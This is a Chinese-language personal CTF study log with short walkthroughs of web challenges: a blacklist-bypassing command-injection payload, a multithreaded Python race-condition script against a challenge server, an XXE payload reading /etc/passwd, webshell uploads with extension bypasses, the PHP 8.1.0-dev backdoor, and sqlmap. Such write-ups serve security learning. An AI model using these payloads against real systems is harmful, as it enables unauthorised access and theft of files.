# 题目复现
## What the cow say?
> 十月第一周周报：反引号内字符串会被解析成OS命令

题目过滤了
```
blacklist: blacklist = ['echo', 'cat',  |
| 'tee', ';', '|', '&', '<',              |
| '>','\\','flag'] def waf(string):
```
payload：`tac /f*/f*`
## Select More Courses
第一步直接按题目给的密码本爆破密码就行了
然后选课有提示
> 阿菇的提示：Race against time!

与时间赛跑，所以要同时提交申请扩分时选课
让脚本一直提交扩分就可以正常操作选课那边了
```python
import requests
import threading
 
 
def send_request():
    url = "http://139.224.232.162:30057/api/expand"
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Connection": "keep-alive",
        "Content-Length": "23",
        "Content-Type": "application/json",
        "Cookie": "session=MTcwODk0OTU3M3xEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fG4_CpDZzCUnkyxz1S5Zo8-xs6XjUM3eYRhc6tLQaZiF",
        "Host": "139.224.232.162:30057",
        "Origin": "http://139.224.232.162:30057",
        "Referer": "http://139.224.232.162:30057/expand",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
    }
    payload = {"username": "ma5hr00m"}
    while True:
        try:
            response = requests.post(url, headers=headers, json=payload)
            print(f"Response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
 
 
# 创建50个线程并发发送请求
threads = []
for _ in range(10):
    thread = threading.Thread(target=send_request)
    thread.start()
    threads.append(thread)
# 等待所有线程完成
for thread in threads:
    thread.join()
```
# 刷题
## [SWPUCTF 2021 新生赛]easyupload1.0
![a8fa010747350378807716c9966ae730.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708955018474-507649cf-f301-4fe1-b494-a94339a1bd6e.png#averageHue=%23cd9a54&clientId=u2d72ddf3-bda9-4&from=paste&height=81&id=u8ee547ab&originHeight=101&originWidth=196&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2714&status=done&style=none&taskId=uc531ed95-0126-4972-a65c-5c3ce7d1f01&title=&width=156.8)
上传图片木马抓包改后缀
![cd9d0c16a0107ecb759aaca0d827d785.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708955072397-81504e48-c6dd-43f2-b83c-55953f89b29e.png#averageHue=%23f9f8f8&clientId=u2d72ddf3-bda9-4&from=paste&height=370&id=ud8013f63&originHeight=462&originWidth=1004&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67429&status=done&style=none&taskId=u714e8f3c-a143-4048-9502-6ba4c5a90d5&title=&width=803.2)
蚁剑链接得到shell
![d977f93201933dbe6db5488ee87e5103.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708955113348-a57c50e0-e4f5-4178-9c17-d51e1ad02adc.png#averageHue=%230d0a0a&clientId=u2d72ddf3-bda9-4&from=paste&height=220&id=ua219cd22&originHeight=275&originWidth=415&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13731&status=done&style=none&taskId=ubae2f3a4-db21-4e70-b118-1615bb5df90&title=&width=332)
遇到fake flag，最后在环境变量中得到flag
![a08a163705895095b1361a3e7d0a8311.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708955160405-38e1db68-2acb-48d3-9ec8-dc89c958ab3c.png#averageHue=%23090909&clientId=u2d72ddf3-bda9-4&from=paste&height=299&id=u4c42ac57&originHeight=374&originWidth=1160&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26301&status=done&style=none&taskId=uf1dc079a-6d74-42ad-8568-06a752c7138&title=&width=928)
## [SWPUCTF 2021 新生赛]easyupload2.0
与上题类似，用phtml后缀绕过
![e67b07262c8f53754ea6775f5556fff7.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708955439241-7a92001c-4b82-4b15-99a2-0f135bc1b84b.png#averageHue=%23faf9f9&clientId=u2d72ddf3-bda9-4&from=paste&height=230&id=u652f1a5b&originHeight=287&originWidth=877&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32029&status=done&style=none&taskId=ub8e17907-d6c2-4cd1-b1f2-ad96d86885a&title=&width=701.6)
拿到蚁剑shell
![6b8d728dc8963371b8f72b7004b307ca.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708955463132-d6b7d0e0-145a-4a0d-b3b1-e38f4975df16.png#averageHue=%23080808&clientId=u2d72ddf3-bda9-4&from=paste&height=311&id=u88084269&originHeight=389&originWidth=1179&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29772&status=done&style=none&taskId=u33fb3128-4c6b-4cbc-bef2-96a2418c5d6&title=&width=943.2)
##  [NCTF 2019]Fake XML cookbook  xxe漏洞
抓包有xml实体
![a60ec5c45a366ae6010384ae5cb19ff4.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709278141895-282714cf-fcbe-4a89-9f8a-acf663a181c4.png#averageHue=%23eeeceb&clientId=u0d73e75e-532b-4&from=paste&height=598&id=ue7d51374&originHeight=747&originWidth=1478&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=99153&status=done&style=none&taskId=u7481797b-c7b4-46dc-adc8-abec6c28279&title=&width=1182.4)
打入恶意实体尝试读文件
```php
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///etc/passwd">
  ]>
<user><username>&admin;</username><password>123456</password></user>
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709278193000-9f07f315-617d-4b28-b39a-d962a5856681.png#averageHue=%23665742&clientId=u0d73e75e-532b-4&from=paste&height=362&id=u9279ee45&originHeight=453&originWidth=801&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47866&status=done&style=none&taskId=u44dde09e-9ce2-4f8c-8e0f-27ce28b26f9&title=&width=640.8)
读flag
![7e0732ef6e8866db0ef5d87b39e3aea6.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709278317034-c3f3ce39-05a4-4d0f-8382-1297e3b40987.png#averageHue=%23948263&clientId=u0d73e75e-532b-4&from=paste&height=264&id=u8061aa06&originHeight=330&originWidth=863&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23404&status=done&style=none&taskId=uc8b4f644-59c5-4aff-8d3d-5ef9d0d8b4b&title=&width=690.4)
# 比赛
## PHP的后门
![edce536faca60d2e774e47153cab226e.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709278509648-763b5ec3-5e0c-4880-8098-b45de01e3fb9.png#averageHue=%23e7e6e5&clientId=u0d73e75e-532b-4&from=paste&height=179&id=ud9aaee87&originHeight=224&originWidth=451&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14871&status=done&style=none&taskId=u87f0c6e6-f919-417f-82e1-82162f1d6ad&title=&width=360.8)
看响应包查php版本
![67f76cbe195b8eb3f5497d476b323307.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709278594113-711623eb-89bd-436a-bf14-34a6194e2c4f.png#averageHue=%23f6f6f6&clientId=u0d73e75e-532b-4&from=paste&height=139&id=u737cf38b&originHeight=174&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8953&status=done&style=none&taskId=u8b775420-2a39-4800-876b-09da833cb3b&title=&width=457.6)
8.1.0-dev漏洞，命令执行成功
![7cd94824d64c253cf8b5d4862c92ed4b.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709278756838-3a74db6d-1346-4c65-a06b-074f777ed11c.png#averageHue=%23fdfcfb&clientId=u0d73e75e-532b-4&from=paste&height=306&id=uc48960c5&originHeight=383&originWidth=827&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14757&status=done&style=none&taskId=ud903e718-712d-4483-ac95-487fca3fe59&title=&width=661.6)
读取flag
![e27f3d1f370f0e24d6834403a53a1f6e.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709278800885-a6875a44-a43f-49a1-96dd-e2862f4cbf91.png#averageHue=%23fcfbfa&clientId=u0d73e75e-532b-4&from=paste&height=212&id=uea680c60&originHeight=265&originWidth=805&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13785&status=done&style=none&taskId=u4635d940-acfc-4d5c-8706-5a3c09f17f3&title=&width=644)
## PHP的XXE
xxe漏洞，打开题目看到phpinfo页面，看xml版本
![image.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709278921325-512da9fd-2424-4f2a-b50a-e2d3bb8ba517.png#averageHue=%23a6cecd&clientId=u0d73e75e-532b-4&from=paste&height=38&id=u5a9cc005&originHeight=48&originWidth=551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1961&status=done&style=none&taskId=u35293f64-1e5e-4c8d-aeb0-16c25c0b799&title=&width=440.8)
存在漏洞直接打入恶意代码得到flag
![450bc20395b11913b56fcb217af83da6.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1709279154449-2f98df12-7150-4771-9cd1-154c96833916.png#averageHue=%23fbf9f7&clientId=u0d73e75e-532b-4&from=paste&height=319&id=u825cb1aa&originHeight=399&originWidth=790&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28233&status=done&style=none&taskId=u861dcf1c-01ec-40e1-85ca-5f19b59074f&title=&width=632)
## Easy_SQLi
sqlmap嗦了
![e1c9dee9712af645473de03f2dbed5cd.png](https://cdn.nlark.com/yuque/0/2024/png/39265092/1709305914804-5052e8c1-b971-428c-8943-ec7ba65a66b0.png#averageHue=%230a0a0a&clientId=ua0bc7150-e9e5-4&from=paste&height=697&id=ufef72d24&originHeight=1255&originWidth=1304&originalType=binary&ratio=1.8000000715255737&rotation=0&showTitle=false&size=149979&status=done&style=none&taskId=u309589d2-aaac-4c85-a45d-f4e6d80cc4b&title=&width=724.4444156576097)
# 总结
开学第一周，来了还是继续学习刷题，还有个qsnctf比赛，开源情报等等事务忙碌，放假因为被拉进村里天天到处走亲戚，在家时间就拿去打sictf了也没能好好学，开学后就显得很匆忙了，一开学选择去nss继续把没打的题刷掉，为qsnctf做做准备捏
